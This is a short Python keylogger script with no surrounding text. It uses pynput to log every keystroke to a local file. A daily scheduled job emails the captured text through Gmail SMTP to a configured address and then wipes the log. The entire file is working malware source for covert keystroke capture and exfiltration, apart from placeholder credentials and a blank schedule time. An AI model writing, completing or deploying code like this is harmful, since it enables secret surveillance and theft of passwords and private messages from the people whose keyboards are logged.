import schedule
import time
from datetime import datetime
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Function to send email
def send_email(subject, body):
    sender_email = "your_email@gmail.com"  # Use a dedicated email for sending
    receiver_email = "email@email.com"  # Your receiving email address
    password = "your_password"  # Your sender email password or app password

    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject
    message.attach(MIMEText(body, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    text = message.as_string()
    server.sendmail(sender_email, receiver_email, text)
    server.quit()
    print("Email sent successfully!")

# Function to read log file and send its content via email
def read_and_email_log():
    with open("keyfile.txt", 'r') as logFile:
        captured_keys = logFile.read()

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_email(f"Keystroke Capture for {timestamp}", captured_keys)

    # Clear the file after sending the email
    open("keyfile.txt", 'w').close()

# Function to handle key press events and log them to a file
def keyPressed(key):
    with open("keyfile.txt", 'a') as logKey:
        try:
            logKey.write(key.char)
        except AttributeError:
            # Log special keys in a readable format
            logKey.write(f"[{key}]")
        finally:
            logKey.flush()

# Main execution block
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    # Schedule the read_and_email_log function to run once a day at the specified time
    schedule.every().day.at("").do(read_and_email_log)  # Set your preferred time

    print("Key logger started. Capturing keystrokes...")
    while True:
        schedule.run_pending()
        time.sleep(1)
